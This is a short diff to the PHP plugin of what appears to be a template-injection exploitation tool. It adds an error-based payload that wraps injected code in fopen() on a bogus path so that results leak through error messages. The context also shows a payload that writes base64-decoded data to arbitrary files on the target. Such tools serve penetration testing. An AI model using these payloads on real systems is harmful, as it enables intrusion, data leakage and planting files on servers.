@@ -25,6 +25,15 @@ class Php(Plugin):
                 'test_render': f'print({rand.randints[0]}+{rand.randints[1]});',
                 'test_render_expected': f'{rand.randints[0]+rand.randints[1]}'
             },
+            'render_error': {
+                'call': 'inject',
+                'render': """{code}""",
+                # "Y:/A:/" is a file path that is unlikely to exist
+                'header': """fopen("Y:/A:/".strval({header[0]}+{header[1]}).rtrim(strval(""",
+                'trailer': """)).strval({trailer[0]}+{trailer[1]}),"r");""",
+                'test_render': f'strval({rand.randints[0]}+{rand.randints[1]})',
+                'test_render_expected': f'{rand.randints[0]+rand.randints[1]}'
+            },
             'write': {
                 'call': 'evaluate',
                 'write': """$d="{chunk_b64}"; file_put_contents("{path}", base64_decode(str_pad(strtr($d, '-_', '+/'), strlen($d)%4,'=',STR_PAD_RIGHT)),FILE_APPEND);""",
